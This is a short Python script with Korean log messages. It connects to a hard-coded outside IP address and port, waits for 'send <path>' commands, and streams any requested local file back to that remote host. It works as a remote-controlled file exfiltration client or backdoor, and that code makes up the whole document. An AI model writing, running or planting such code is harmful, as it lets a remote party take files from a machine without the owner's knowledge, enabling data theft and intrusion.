from socket import *
from log import log
import os

HOST = "3.35.11.82"
PORT = 51753

sock = socket(AF_INET, SOCK_STREAM)
sock.connect((HOST, PORT))

while 1:
    cmd = sock.recv(1024).decode("utf-8")
    if cmd.split(' ')[0] == "send":
        target = cmd.split(' ')[1]
        log(f"파일전송 : {target}")
        if not os.path.isfile(target):
            log(f"요청한 파일이 없음 : {target}")
            sock.send("no file".encode())
            continue
        with open(target, "rb") as file:
            try:
                data = file.read(1024)
                while data:
                    sock.send(data)
                    data = file.read(1024)
            except Exception as e:
                log(e, 1)
        log(f"파일전송 완료 : {target}")
